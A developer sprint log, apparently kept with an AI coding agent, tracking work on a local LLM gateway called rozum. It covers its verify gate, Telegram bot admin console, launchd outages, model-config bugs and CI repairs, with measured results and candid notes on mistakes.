# Sprint

> **Scope decision — operator 2026-08-04: the model is frozen on `mlx-community:Qwen3.5-4B-MLX-4bit`.**
> There is no model-selection question left, and no other tier is even on disk (`~/.cache/huggingface`
> holds that one snapshot and nothing else). Thirteen items whose payoff was tied to another model
> (gpt-oss, GLM-4/4.7, Devstral, Qwen3-Coder, 35B), to a driver we do not run (codex/opencode), or to
> hardware we do not have (x86/Vulkan) were moved VERBATIM to `BACKLOG.md` under
> "Deprioritised 2026-08-04", each with a **Parked because** line saying what would revive it.
> **Before adding a new item here, ask what it buys the one model that actually runs** — if the answer
> is "it helps when we adopt model X", it belongs in BACKLOG, not SPRINT.

### ▶ Verify gate in the other two nadias (operator 2026-08-04: "Продолжай работу")

Cross-repo (`REPOS.md`): the code is in `../nadia`, branch `feature/verify-gate-ports`,
worktree `nadia:.worktrees/feature/verify-gate-ports`. The contract already exists —
`nadia:SPEC.md` §3.1, written when the Rust one landed — so this is implementation against a
spec, not new design. **It is a debt I created**: §3.1 says "the ScalaScript and Scala 3 ones do
not have it yet. That is a gap in them, not an option."

- [x] **vgp-scala3 — DONE** (`nadia:43f064e`). `scala/sdk/Verify.scala` (generic) +
  `scala/rozum/Gate.scala` (policy), 9 tests deliberately twinned with the Rust ones. The
  scripted-ModelClient test exercises the whole derivation — prose-wrapped JSON, checkable=false,
  an unreachable model — with no model at all; that is what the interface is for.
- [x] **vgp-ssc — DONE** (`nadia:2649bbd`, fix `nadia:` exec arity). ~150 lines against Scala 3's
  ~230 for the identical contract — the difference is exactly what `std.agent` and `std.process`
  already provide, the same finding SPEC §0 records for the loop.
- [x] **vgp-parity — DONE.** Rust 9 tests, Scala 3 nine twins, and — since the ScalaScript side has
  no test harness in that repo — `src/gate-check.ssc`, 18 rules that exit non-zero when one changes.
  It earned its keep twice on the first run: `listDir` raises on a missing directory (and
  `misplacedProject` runs on exactly the failure path where the workspace may be gone), and
  `runCheck` was calling `exec` with the wrong arity while all fifteen PURE rules passed. The
  missing harness is recorded in `nadia:BACKLOG.md` rather than papered over.

**Cost recorded, because it was mine:** the ScalaScript front-end works in cwd by design, I ran it
from inside its own worktree to test the gate live, and the agent did as asked — `cargo init` in
the workspace it was given, which was the repository. `git add -A` then committed `Cargo.toml` and
`src/main.rs` next to `nadia.ssc`. Removed in `nadia:` with the reasoning; the two rules that would
have prevented it are already written down: never give an agent a repository as its workspace, and
never `git add -A` a tree an agent has touched.

### ▶ Verify-gate accuracy (operator 2026-08-04: "Начинать с (1) и (2)" → "продолжай, начинай и продолжай")

Branch `feature/verify-gate-accuracy`, worktree `.worktrees/feature/verify-gate-accuracy`.
Spec: `docs/specs/verify-gate.md` (written first). Contract for the agent side is
`nadia:SPEC.md` §3.1 — this spec covers the shared primitives in `rozum-agent::verify`
that both `rozum launch` and nadia's gate run on.

Both items came out of ONE measured run, not from review: the gate correctly failed a task
(`✘ проверка НЕ прошла`, rc=1 — which is the gate working) but both repair rounds were spent
fighting the check rather than the task.

- [x] **vga-arg-quotes — DONE** (`f1c2b7d`). `derive_check` keeps the quotes the task wrote around the argument.
  From `cargo run -- "3 4 + 2 *"` it derived `arg = '"3 4 + 2 *"'`, so the check demands a
  program that accepts a quoted argument, which nobody asked for. Strip a symmetric pair of
  surrounding quotes from `arg`/`expect` when building the fragment, and say so in the prompt.
  Affects `rozum launch` identically — one definition, two consumers.
- [x] **vga-project-root — DONE** (`f1c2b7d`). a model that runs `cargo new <name>` puts the project in a
  SUBDIRECTORY, so a check that runs `cargo` at the workspace root cannot pass however good the
  code is. Two halves: the system prompt says to create the project in the workspace root, and a
  failed check whose root has no manifest while exactly one child does SAYS that in the repair
  prompt instead of leaving the model to guess. Do not silently `cd` into the subdirectory —
  that hides a real mistake behind a passing check.
- [x] **vga-verify — DONE 2026-08-04.** Same task, same model, same machine. Before:
  `✘ проверка НЕ прошла`, rc=1, both repair rounds spent on the check. After: **rc=0,
  `✔ проверка прошла`, ZERO repair rounds** — derived `cargo run -q -- '3 4 + 2 *'` (the value,
  not the task's spelling) and the project written to the workspace root. The artifact checks out
  by hand too: `3 4 + 2 *` → 14 and `5 1 2 + 4 * + 3 -` → 14.

### ▶ Messenger admin console (operator 2026-07-27: "CLI для реестра … заведи. И в контрол центре тоже сделай отдельный экран и инструмент для управления ботами и группами в телеграме")

Branch `feature/messenger-admin-console`, worktree `.worktrees/messenger-admin`.
Spec: `docs/specs/messenger-admin-console.md` (written first — read it, it carries the operator's
two scope decisions and the security constraints they imply).

- [x] **msgadmin-core — DONE** (`d038adb`). `crates/rozum-meeting/src/messenger_admin.rs`: ONE
  implementation the CLI, the REST layer and the in-chat commands all go through. Bot roster
  (seeded from the shipped deployments when their token file exists, so the console shows the truth
  on first run instead of demanding the operator re-register bots that already work), group
  add/remove, per-room ACL, launchd state + control, generation of a new bot's wrapper + plists.
- [x] **msgadmin-cli — DONE** (`d038adb`). `rozum-gateway messenger {bots,status,groups,acl,service,
  bot-add,bot-remove}`. `telegram --room … --name …` untouched. **Running it found a bug no unit
  test would have: Telegram group ids are always negative and clap read `-1004378341901` as a flag**,
  so the commonest invocation failed — `allow_negative_numbers`.
- [x] **msgadmin-bridge-watch — DONE** (`d038adb`), predicate unit-tested, integration NOT yet
  proven live (the machine still runs the Jul-23 bridge — see msgadmin-verify).
- [x] **msgadmin-rest — DONE** (`60bea2a`). `/control/messenger/*` behind `require_auth` +
  `require_admin`. Token to the child on STDIN, never argv.
- [x] **msgadmin-ucc — DONE** (`60bea2a`). `#/messenger`, three sections, one status signal.
- [x] **msgadmin-verify — DONE + DEPLOYED 2026-07-27** (merged `7458363`, deploy fix `b474eea`).
  Workspace **736 passed / 0 failed**; `emit-spa` compiles the page (0 JS errors); every route 401s
  unauthenticated while an unknown sibling path 405s. **Live after deploy:** a CLI `groups add` was
  picked up by the RUNNING bridge with no manual restart (`group registry changed on disk —
  restarting to apply`, runs 1→2), the pool spawned a participant for the new room with its own
  roster, the bogus chat was skipped leniently while the private chat stayed served, and `remove`
  reversed all of it (runs→3, participant reaped, registry empty). **`ucc-e2e.mjs` 25 cases, 22
  pass** — all 6 new messenger cases green incl. a real `@…bot` row from the admin-gated route; the
  3 failures are the pre-existing env ones (sole model already resident → no load button).
  All six services `runs=1` after the deploy, `:8089` + `:8411` listening.

- [x] **deploy-async-bootout — FIXED 2026-07-27** (`b474eea`). Found BY deploying the above:
  `launchctl bootout` returns before the job's slot is free, the gateway's slot drains slowly
  (4B model), so the script's `sleep 1` + one retry BOTH lost the race and left the gateway GONE —
  a second silent :8089 outage, one day after BUG-013. The readiness gate from this morning is the
  only reason it surfaced during the deploy instead of days later. Fixed at the root: a bounded
  retry loop (10 × 2s) shared by ucc-control and the gateway, last attempt unsilenced so a genuine
  failure still shows its reason. **Note for anyone touching launchd here: `bootout` + immediate
  `bootstrap` is ALWAYS a race; never paper over it with a sleep.** Also staged
  `~/.cargo/bin/rozum-gateway` (what the messenger services exec — the deploy only ever refreshed
  `~/.rozum/bin`, which is how the assistant sat on a 4-day-old binary) and re-registered the four
  messenger jobs with bootout+bootstrap, not kickstart, per BUG-013.

SECURITY (operator chose the deeper option knowing the trade-off — see the spec): the bot token is
write-only. Accepted on `bot/add`, `getMe`-validated BEFORE anything is written, stored 600 in
`~/.rozum/secrets/`, never returned by `status`, never rendered, never logged, and stripped from any
URL that could reach an error message.

### ▶ Live-service triage (operator 2026-07-27: "Какое состояние проекта … что нужно дальше делать?" → "Берись")

- [x] **gateway-launchd-crashloop — FIXED LIVE 2026-07-27.** The shared gateway on :8089 had been in a
  KeepAlive crash-loop since 23 July (`runs = 36301`, `last exit code = 78 EX_CONFIG`, zero log output),
  so **the messenger assistant — the entire 20-23 July arc — had no model backend for 4 days** and nothing
  reported it. Fixed by `launchctl bootout` + `bootstrap` (stale job registration vs the replaced binary);
  verified `:8089` LISTEN + a real completion + a live reply from `qwen` in room `assistant`. Every other
  rozum service was healthy. Added a readiness gate to `deploy-ucc-web.sh` (step 5c) so this fails the
  deploy loudly instead of silently. Full write-up: **BUGS.md BUG-013** — read that, not this summary.
  **LESSON (generalizes past this bug):** we have no liveness signal for the daemons we ship. Every
  green surface we look at — tests, CI, `launchctl list`'s bare exit column — stayed green through a
  4-day outage of the flagship feature. See the `service-liveness-watch` backlog item.

- [x] **second-bot-groups deployed (@rozumia_bot)** — the tail of `f89bcfd`. `com.rozum.assistant-groups`
  (participant pool, registry `telegram-groups`, primary room `rozumia`) is **loaded and running**: the
  pool spawned its participant, which joined `rozumia` against the restored :8089. Token verified
  (`getMe` → `@rozumia_bot`, id 8873553843, can_join_groups). `com.rozum.telegram-groups` (the bridge)
  is **installed but deliberately NOT loaded** — see the blocked item below.

- [x] **second-bot-groups-start — DONE 2026-07-27, private half LIVE.** The bridge had been dying at
  startup with `getChat failed (400): Bad Request: chat not found` — NOT a bug: its primary chat is the
  owner's DM with `@rozumia_bot` (`TELEGRAM_CHAT_ID` = the owner's user id 1711036782), and **that DM
  does not exist until the owner presses Start** (`getUpdates` returned 0 updates — the bot had never
  been messaged). Operator pressed Start; `getChat` then returns `type=private id=1711036782`, and
  `com.rozum.telegram-groups` bootstraps clean: `state = running`, `runs = 1`, log
  `bot 8873553843 chat 1711036782 <-> room 'rozumia'`. E2E PROVEN: a ping posted into room `rozumia`
  was answered by `qwen` ("Подключён.") — the second bot's private half works end to end on the shared
  :8089. All five services steady afterwards (`telegram-groups`/`assistant-groups` runs=1). The one
  gateway restart in that window is BY DESIGN (idle-unload, `last exit code = 0`, KeepAlive re-ran it,
  still LISTEN) — not a relapse of BUG-013.
  ISOLATION verified so far, structurally: the group registries are genuinely namespaced —
  `messenger-groups/telegram.json` still holds only the personal bot's one group (`-1004378341901` →
  `assistant-group`, untouched), and `telegram-groups.json` does not exist yet because the second bot
  has no groups. Per-room ACL likewise got its own fresh `messenger-acl/rozumia.json`.

- [x] **stale-group-registry-cleanup — DONE 2026-07-27.** The operator accidentally LEFT the test
  supergroup `-1004378341901` "Rozum Group" and cannot get back in. Established via Bot API, not guessed:
  the group still exists but is **orphaned** — `getChatAdministrators` returns EMPTY (the owner left with
  him), member count 2 = the two bots, both plain `member`, and it is private with no `username`.
  There is no way back from our side and it is not a rozum limitation: **the Bot API has no method to add
  a user to a chat at all**, and `createChatInviteLink`/`exportChatInviteLink` both require admin rights
  that no one can now grant. Treat the group as lost. CLEANED UP: dropped the entry from
  `messenger-groups/telegram.json` (now `{"groups":[]}`) — the pool reconciles every 5s and reaped the
  orphan child (`stopping participant for removed room 'assistant-group'`), and `com.rozum.telegram` was
  restarted (it reads the registry only at startup) so it routes just `chat 1711036782 <-> room
  'assistant'`. Live participants are now exactly the two DM rooms, `assistant` + `rozumia`.
  NOTE for next time: the DESIGNED path is `/removegroup <id>` in the owner's DM with the bot — it edits
  the registry AND re-execs the bridge in one message. Direct file edit works (the pool polls) but needs
  the manual bridge restart. There is no CLI for the registry; if that keeps coming up, add one.

- [ ] **second-bot-groups-verify** (NEEDS THE OPERATOR — the group half is untestable from a shell) —
  the actual point of `f89bcfd` is still unproven, and the group it was going to be proven in is now
  lost (above), so it needs a FRESH group: create one, add `@rozumia_bot`, **make it an admin** (or
  privacy off — otherwise it sees no messages, the known gotcha), send `/addgroup` there. THEN check, in
  this order: a namespaced entry lands in `messenger-groups/telegram-groups.json` (and NOT in
  `telegram.json`); `com.rozum.assistant-groups` reconciles and spawns a participant for that room; it
  answers ONLY when addressed as `@rozumia_bot` and stays silent otherwise; the personal bot's registry,
  rooms and ACL rosters are untouched.

- [x] **ci-green-baseline — DONE 2026-07-16 (`9506811`, `06de22c`, `645f5e7`,
  `5b675ea`, `a3595c6`).** Restored CI after the workspace/binary split: macOS gates shipped defaults
  plus every workspace library, Linux gates the whole no-default workspace, and Windows gates the thin
  dispatcher plus an honest portable-package allow-list. Real Actions run `29533946535` is green on
  all three hosts. The real Windows runner also drove `.exe` dispatch/PID-liveness fixes and a
  lock-safe residency queue/ledger design. Spec: `docs/specs/ci-green-baseline.md`.

### ▶ Post-reboot resume (operator 2026-07-15: "перезагрузился компьютер … продолжить работу дальше")

- [x] **env-metal-toolchain-gone** — DONE (machine-level, no repo change). FALLOUT OF THE SYSTEM UPDATE:
  Xcode 26.6 survived but the **Metal Toolchain component did not** (`xcrun -sdk macosx metal --version` →
  "cannot execute tool 'metal' due to missing Metal Toolchain"). The RUNTIME is unaffected (the existing
  `target/release/rozum-gateway` loads + serves models fine), so this hides until something compiles MLX
  from scratch — i.e. **any fresh worktree / clean build** → mlx-sys build script dies with `Error 2`.
  Fix = `xcodebuild -downloadComponent MetalToolchain` (restored: `Apple metal version 32023.883`).
  WORKAROUND if it recurs and you don't want to wait for the download: point a fresh worktree at the warm
  main target dir (`CARGO_TARGET_DIR=/Users/sergiy/work/my/rozum/target`) — mlx-sys is reused, build ≈ 6s.

- [x] **mlx-nested-config-nctx** — DONE + PROVEN, branch `feature/mlx-nested-config-nctx` (`b2be8a0`,
  `5480e15`). Found while auditing the chat `--n-ctx` change the previous session left uncommitted on
  master. **REAL BUG, two symptoms, one cause**: `mlx_native_backend::read_config` read
  `max_position_embeddings` / `eos_token_id` at the TOP level of `config.json`, but a multimodal snapshot
  nests them under `text_config` (top level = vision/wrapper fields only) → both None → silent fallbacks:
  (1) **the flagship Qwen3.5-4B served n_ctx 32768 while advertising 262144** — the sizing layer
  (`src/main.rs::model_max_ctx`) DOES read text_config, so admission reserved ~8 GiB of KV the backend
  could never use, and any prompt over 32k was trimmed against a window the user was told was 262k;
  (2) eos came back empty → the `QWEN3_EOS` fallback (151645) applied, which is `<|im_end|>` in the *Qwen3*
  vocab but an **ordinary Thai word token** in Qwen3.5's 248044-entry vocab — an arbitrary text token wired
  in as a stop token (silent mid-answer truncation waiting to happen); the real eos `<|endoftext|>` 248044
  was never added. Chat only worked because the tokenizer_config path supplies `<|im_end|>` 248046.
  FIX = read both from the text_config-aware node (same idiom as `kv_bytes_per_position` / `model_max_ctx`).
  **`model_type` deliberately stays TOP-level** — it is the arch dispatch key (`qwen3_5`); text_config's own
  value is `qwen3_5_text`, which no loader matches (a blanket `unwrap_or(text_config)` would break VL).
  PROOF on the real model — before: `ready (context 32768)` + stop tokens `[151645, 248046]`; after:
  `ready (context 262144)` + `[248044, 248046]` (= the principled set this file's own comment describes).
  Generation still finishes clean (`finish_reason=stop`), tool calls still parse (`finish_reason=tool_calls`),
  rozum-mlx 41 tests green, and the new nested test FAILS on pre-fix code (32768 != 262144).
  NOTE the diagnostic that already existed for exactly this — `probe_model_profile` logs "stop tokens …"
  precisely to catch "a config-vs-template eos mismatch". It printed `151645` on every single load; nobody read it.
  **Scope**: only nested-config (multimodal) snapshots. Today just Qwen3.5-4B is installed, but per the VL
  port the flagship **Qwen3.6-35B-A3B also has vision** → same layout, same bug — re-check when installed.

- [x] **gw-optional-families-cargo** — DONE (fork `2df597b7`, rozum this commit). Executed the operator's
  decision (fork-level per-model features). **TWO MATERIAL FINDINGS — read these before believing the old
  estimate, both measured not guessed:**
  1. **The scope estimate was ~4x too PESSIMISTIC.** The board said "~20+ sites per family / ~80-site cfg
     cascade". Real count for the four named families: **21 sites** (GptOss 12, Glm4 5, Glm4MoeLite 2,
     DeepseekV2 2); ~50 across all nine. And most were `matches!(model, LoadedModel::GptOss(_))`, which
     collapse to ONE cfg via a family predicate (`is_gpt_oss`/`is_glm4`) instead of a cfg per call site.
     The dreaded "cfg on every arm or exhaustive matches break" mostly did not materialize: the big
     dispatches (`dense_forward`, hybrid init/prefill/forward) already had `_` fallbacks.
  2. **The WIN is much smaller than "real leaner binary" implied: 50.34 MB -> 49.16 MB = 1.18 MB (2.3%).**
     The mlx-lm rlib itself drops 7.02 -> 2.39 MB (-66%), but only monomorphized-and-linked code reaches
     the binary, so 4.6 MB of rlib becomes ~1.2 MB of binary. Build time is unmoved (~1s of a 2m22s build):
     **mlx-sys/MLX C++ dominates everything** (33 MB rlib, 715 MB of build artifacts) and is untouched by
     any of this. If a genuinely smaller rozum is ever the goal, MLX C++ is the only lever that matters —
     model gating is noise next to it.
  SHIPPED ANYWAY because it is done, correct, default-ON (zero change to what rozum ships) and cheap to
  keep: `default = ["mlx-native","all-models"]`, and `mlx-native` is now the RUNTIME only so lean is
  reachable (`--no-default-features --features mlx-native` = qwen core; `+rozum-mlx/model-glm4` to pick).
  Fork: families are leaves (nothing references them but their `pub mod` line) → `#[cfg]` + `[features]`,
  `default = ["all-models"]` so other consumers are unaffected. The qwen3/qwen3_5/qwen3_5_vision/gated_delta
  CORE is deliberately UNGATED: **qwen3 <-> qwen3_5 reference each other and cargo features must be a DAG**,
  plus lib.rs impls ModelInput for qwen3. One edge survives: `qwen3-5-moe = ["qwen3-moe"]`.
  VERIFIED: 7 feature combos compile (lib AND tests) incl. `--no-default-features`; lean binary genuinely
  lacks the `mlx: load glm4|deepseek_v2|gpt_oss|glm4_moe_lite` loaders while keeping qwen + the
  unsupported-type fallback; default binary unchanged at 50.34 MB, still loads + serves (context 262144);
  609 workspace tests green. GOTCHA hit on the way: two `#[ignore]`d benches were gated on `mlx-native`
  but loaded glm4/qwen3_5_moe checkpoints → they broke the LEAN *test* build only (the lib was fine) —
  the same `cargo check` blind spot as gw-test-suite-not-compiling. Gated them on their family.

- [x] **gw-test-suite-not-compiling** — DONE (`08c9d9a`). Found by running `cargo test -p rozum-gateway`
  right after the merge above (it is NOT part of any routine here). **The gateway's entire 106-test suite
  had silently stopped running**: 62 compile errors, so 0 tests executed. PRE-EXISTING, not from today's
  work — the identical 62 errors reproduce at `41be87a`. Cause: `gw-per-dialect-split` / the `codex_patch`
  extraction moved the apply_patch + codex-tool-arg rewriters and the SSE types out of gateway.rs, which
  removed gateway.rs's OWN imports of them (the handlers that used them had left). The test module leant on
  `use super::*` to reach them — and even carried a comment asserting "`super::*` re-exports gateway's
  `use crate::codex_patch::*`" — but **a glob of `super` can only re-export what `super` still imports**.
  The LIB kept compiling the whole time, so `cargo check` stayed green and SPRINT's "106 tests green" note
  went stale without anyone noticing. FIX = import the symbols explicitly in the test module + delete the
  comment that asserted the broken mechanism. **106/106 pass again** — the exact count the split reported,
  i.e. the corpus was intact all along, it just had not been BUILT since. Swept the rest of the workspace:
  `cargo test --workspace` compiles clean and is green everywhere else (rozum-core 131, rozum-agent 121,
  rozum-meeting 108, rozum 65, rozum-mlx 41, …) — gateway was the only rotted suite.
  **LESSON (worth generalizing)**: `cargo check` does NOT build `#[cfg(test)]` code, so a test suite can rot
  to zero while every green signal we look at stays green. A `cargo test --workspace --no-run` in CI would
  have caught this the day it broke. Candidate follow-up — see BACKLOG.

- [x] **chat-nctx-32k rationale corrected** (`5480e15`) — the previous session's uncommitted master change
  (`--n-ctx 32768` for chat runs) was kept but its comment was WRONG: it claimed a 262k KV makes the cold
  load take 1-2 min. It does not — KV grows **lazily** per token, never pre-allocated, so n_ctx costs
  nothing at load. MEASURED (page-cache warm, load → first completion): **1.2s at default 262144 vs 1.4s at
  32768** = noise. (It was also a no-op before the fix above, since the backend clamped to 32768 regardless.)
  What the cap actually buys is **admission headroom**: the gate sizes weights + KV(n_ctx) + reserve, so an
  uncapped chat turn reserves ~14 GiB vs ~7 GiB — and on a busy host THAT is what makes a chat turn queue
  behind a resident model, the likeliest true source of the 1-2 min. Kept, comment rewritten to the measurable.

### ▶ Matrix reliability (operator 2026-07-14: "исправь и оно работало" re the last-run codex reds)

- [x] **matrix-reliability-greedy-repair** — DONE + PROVEN + MERGED (`4df4e54`). The two codex reds
  (`debug`, `rpn`) in the newbuild validation matrix were a MEASUREMENT artifact, not a gateway bug.
  DIAGNOSIS (fact, not guess): (1) the same Qwen3.5-4B passes those cells 8/8 under claude AND opencode;
  (2) a bare re-run of the two codex cells = 2/2 green — the model writes correct code (rpn `35`/`14`,
  debug `cargo test` green), via heredoc `cat > src/main.rs`, not even apply_patch; (3) the new
  `toolcall_parse_miss` obs logged exactly ONE benign miss in the whole run (a greet-task hybrid tool call
  that still passed) → NOT a tool-delivery parser bug. ROOT CAUSE = irreducible Layer-A variance (the agent
  CLIs stamp a fresh session-id + ts into every prompt, so the token stream differs run-to-run even at a
  fixed seed) EXPOSED by a single-run cell whose validation launch had verify-repair OFF (`agentic.sh`
  default `REPAIR=0`) — the failed cells show `repairs=0, pass=0`, impossible under `REPAIR=1` (a first-fail
  would increment `repairs`), which nails REPAIR=0. FIX (both matrix launchers, env-overridable):
  `run_full_matrix.sh` + the `control.rs` UCC matrix job now default `ROZUM_FORCE_GREEDY=1` (temperature 0 /
  argmax — most reliable decode for these deterministic coding tasks, removes the gateway sampling RNG) and
  `REPAIR=2` (a verified FAIL feeds the real compiler/test error back for up to two fresh attempts; costs
  wall-clock only on cells that fail). PROOF: greedy + REPAIR=2, codex, Qwen3.5-4B, 3 reps each →
  **debug 3/3, rpn 3/3 = 6/6 green**, and 3 of the 6 reached green via `repairs=1` (would have been hard
  reds under the old single-shot REPAIR=0). `control.rs` compiles clean. The `run_full_matrix.sh` half is
  LIVE immediately (script + existing `force_greedy` binary logic); the `control.rs` UCC half takes effect
  once the deployed `~/.rozum/bin/rozum-gateway` (control-serve :8411) is rebuilt + restarted.

### ▶ Gateway round-2 (operator 2026-07-14: "Запиши в спринт и сделай …" — decisions confirmed via AskUserQuestion)

- [x] **gw-default-mlx-native** — DONE (this commit): verified lean build compiles + native MLX serves. (operator 2026-07-14: "сделай default = [mlx-native]") — drop `gguf` from the
  default feature set: `default = ["mlx-native"]` (was `["mlx-native", "gguf"]`). Leaner default build (no
  llama-cpp-2 / llama.cpp cmake), Qwen/MLX out of the box; GGUF/lmstudio/ollama become opt-in `--features gguf`.
  Safe: `try_build_gguf_backend` already has a `#[cfg(not(feature="gguf"))]` None-stub (same pattern as
  mistralrs), so the lean build compiles + the native MLX path is unaffected. Verify native-MLX smoke stays green.

- [x] **gw-cache-cap-by-size** — DONE (this commit): 4B footprint 8.60→6.60 GiB (cache cap 4→2). — scale the MLX buffer-cache cap by model size. Today it's a flat 4 GiB
  (`ROZUM_MLX_CACHE_GB`), baked into the activation reserve (cache_cap + 1.5 GiB ≈ 5.5 GiB). A 4B model
  uses ~1.2 GiB cache (smmr-D), so 4 GiB is generous → ~2 GiB of reservation is dead weight. Make the
  default cap `min(4 GiB, max(1.5 GiB, weights/2))` so a small model reserves less (admits more / leaves
  more free); env override + the calibrated floor preserved. Memory win realizes under co-residency /
  bigger models; harmless for a single small model.

- [x] **gw-closed-loop-phase2** — DONE (this commit): flag-gated, validated no-false-fire on 4B (measured active 2257 MB, weights ARE materialized at load — not lazy). — measured mid-load OOM-abort behind `ROZUM_CLOSED_LOOP_ADMISSION`
  (default OFF). After weights materialize, read `get_active_memory()`; if `active + keep_free > total_ram`
  the first prefill will OOM → refuse NOW (clean error, don't serve) instead of a reboot. Unit-test the
  decision logic + verify it does NOT false-fire on the 4B. The "actually prevents a reboot" claim stays
  UNPROVEN until a big model + a push-to-jetsam rig (operator: flag-gated is acceptable). Spec
  docs/specs/gateway-closed-loop-admission.md phase 2.

- [x] **gw-per-dialect-split** — DONE: all 3 dialects (oai_api/anthropic_api/responses_api) extracted, handlers stay as composition roots, gateway.rs 6841→4256 (-38%), 106 tests + 3-dialect E2E green. — the real architectural monolith split (after the 3 leaf extractions). Each
  inbound dialect takes its OWN wire DTOs + mapping + handler + SSE into a module: `oai_api.rs`
  (`OaiChatReq`/`OaiMsg` + `oai_messages_to_internal` + `oai_chat_handler` + `oai_sse_stream`/`oai_collect`),
  `anthropic_api.rs`, `responses_api.rs`. gateway.rs keeps routing + `GatewayState` + admission-glue. FINDING
  (2026-07-14): unlike the 3 leaf clusters, the HANDLERS are entangled — `oai_chat_handler` alone calls
  ~7 shared gateway helpers (`chat_or_loopbreak`, `fit_to_context`, `estimate_prompt_tokens`, `error_json`/
  `chat_error_response`, `apply_tool_choice`, `with_gen_timeout`) + `GatewayState` (`state.observer`/`state.sb`).
  So the split needs those helpers made `pub(crate)` + cross-module imports (architectural, many back-refs —
  NOT a clean-leaf move like codex_patch). Doable with tests as the net, but it's the big careful pass. The
  DTOs+mapping+SSE sub-parts are cleaner than the handler. **DECISION (operator): DO IT FULLY** — all 3
  dialects, `pub(crate)` the shared helpers, tests + E2E as the net, dialect-by-dialect with a commit each.

- [x] **gw-optional-families-cargo** — SUPERSEDED by the DONE entry at the top of this sprint (executed 2026-07-15; the ~80-site estimate below proved ~4x pessimistic — real: 21 sites — and the win proved ~2.3% of binary, not "real leaner binary"). Original analysis kept for the record:
  (1) **mistralrs is ALREADY compile-time-optional + OFF by default** — `default = ["mlx-native","gguf"]`
  excludes `mistralrs = ["rozum-mistralrs/mistralrs"]`, and `try_build_mistralrs_backend` has a
  `#[cfg(not(feature="mistralrs"))]` None-stub. The heavy candle/mistral.rs dep is NOT in the default build.
  So the "make the fallback backend optional" ask is essentially satisfied (only the 434-line thin wrapper
  crate is always pulled — negligible). (2) **Family gating buys little on the rozum side**: the family MODEL
  code (glm4.rs / deepseek_v2.rs / gpt_oss.rs — the bulk) lives in the vendored **mlx-lm fork**, always
  compiled under `mlx-native`; gating in rozum only removes the thin loader ARM (one match arm each, behind a
  `LoadedModel` enum variant → cfg CASCADES across every match site) + the rozum-side parser. Small binary win,
  real cfg-cascade risk. The genuine leaner-binary win needs per-model features in the mlx-lm FORK — a bigger,
  separate effort. **DECISION (operator via AskUserQuestion): do the FORK-LEVEL win** — per-model Cargo features
  in the vendored mlx-lm fork so a family's MODEL code (glm4.rs / deepseek_v2.rs / gpt_oss.rs) isn't compiled
  unless opted in; rozum's loader arms + parsers follow. Real leaner binary. Multi-repo: edit fork → rev-bump →
  MLX rebuild (~3-4 min/iter) → test lean + full combos. mistralrs part already done (off by default).
  SCOPE FINDING (2026-07-14): the rozum side is a ~80-site cfg cascade — each family's `LoadedModel` enum
  variant (GptOss/Glm4/DeepseekV2/Glm4MoeLite) is matched at ~20+ sites (loader, `Generate` dispatch,
  harmony/constrain detection, forward), and gating the variant means `#[cfg(feature)]` on EVERY arm or the
  exhaustive matches break under a feature combo. Combined with the 3-4 min MLX rebuild per iteration + the
  fork edits, this is a large, slow, error-prone pass that genuinely warrants a focused session — NOT the tail
  of a marathon where a missed arm surfaces only after a rebuild and risks the model-loading core. PLAN is
  precise (fork: `#[cfg]` on model mods + Cargo features; rozum: gate variant + all arms + loader + parser;
  test lean=qwen-only + `--all-features`). Ready to execute as a dedicated pass.

### ▶ Gateway improvements (operator 2026-07-14: "Что ещё можно улучшить в гейтвее? … Записывай всё и делай")

Grounded in what this session's matrix work exposed + the gateway architecture. Ordered by value.

- [x] **gw-spec-normalization + honest-footprint** — DONE (this commit). Two live-hit UX/robustness bugs:
  (a) a `--model` spec in the SLASH form (`mlx-community/Qwen3.5-4B-MLX-4bit`) or `hf:` form never matched
  the catalog's canonical COLON spec (exact `m.spec == spec` at EIGHT sizing/CLI call sites) → the
  footprint couldn't be sized → the sentinel path fired (dry-run showed `4294967296 GiB`, load refused).
  Fix = `model_source::same_model(a,b)` (normalizes both via `spec_to_hf_repo`; exact-eq fallback for
  path/lmstudio/modelscope), applied everywhere a user spec is matched to the catalog: WarmConfig weight
  closure, `estimate_model_footprint_bytes`, dry-run, `model_is_locally_cached`, `resolve_n_ctx`, the
  co-residency sum, and `models rm`/`models info`. Unit-tested. Verified: slash dry-run → 8.60 GiB WOULD
  LOAD; `models info mlx-community/…` → "installed locally". (b) A genuinely-unsizeable spec (raw
  snapshot-DIR path, uncached id) still yields the sentinel; `acquire_residency` used to print a garbage
  "~4398046511103 MB would overcommit" and WAIT 240s for an impossible amount to free. Fix = consolidated
  the two ad-hoc sentinels into `share::UNSIZEABLE_FOOTPRINT_BYTES` (value) + `UNSIZEABLE_FOOTPRINT_FLOOR`
  (detection threshold, `u64::MAX/8`, below any real footprint) and a short-circuit at the top of
  `acquire_residency`: footprint ≥ floor → deny IMMEDIATELY (no wait, no garbage line); the CLI's existing
  "size UNKNOWN → pass a canonical id / pre-download / bypass" message (keyed on the same const) does the
  talking. Verified: raw path → honest message in 0s, not 240. Closes the BACKLOG cosmetic item too.

- [x] **gw-prefix-reuse-driver-audit** — RESOLVED, NO CODE (investigated 2026-07-14). Hypothesis: codex/
  opencode are 3–5× slower than claude on the SAME model because they miss the gateway's prefix reuse.
  FALSE: `PrefixStore` keys on the TOKEN prefix and is driver-agnostic; it's disabled only per-request
  for VL (image splice breaks the token prefix, mlx_native_backend.rs:1701), not per-driver, and the
  matrix's codex/opencode tasks were text-only. So codex/opencode DO get prefix reuse; their slowness is
  harness-side (more turns / apply_patch + Responses parsing per turn), not a gateway gap. No lever here.

- [~] **gw-closed-loop-admission** — phase 1 SHIPPED, phase 2 SPEC'd (spec
  `docs/specs/gateway-closed-loop-admission.md`). The biggest architectural lever: admission is open-loop
  (a pre-load ESTIMATE — today's 35B refused at 21.6 GiB est vs 21.75 free, and we never learned if it'd
  truly fit; the dangerous direction is UNDER-refuse → reboot). The measured-feedback half already existed
  (smmr-D tightens the estimate toward prior measured peaks; `shed` reacts to jetsam AFTER load).
  **Phase 1 DONE (this commit):** at the Drop measurement, compare the REAL peak against the estimate this
  model was admitted against and emit `footprint_underestimate { model, prior_estimate_mb, measured_peak_mb,
  exceeded_by_mb }` when reality exceeded it — surfacing the open-loop gap in telemetry (record_peak already
  self-corrects the cache upward for the next load). Zero behavioural change. **Phase 2 (DESIGNED, not
  rushed):** measured mid-load abort — a post-weights checkpoint + chunked-prefill watermark that reads
  `get_active_memory()` and aborts BEFORE the spike crosses RAM, converting a guaranteed reboot into a clean
  refusal. Safety-critical (no-reboot invariant + hot prefill path) and its failure path can't be exercised
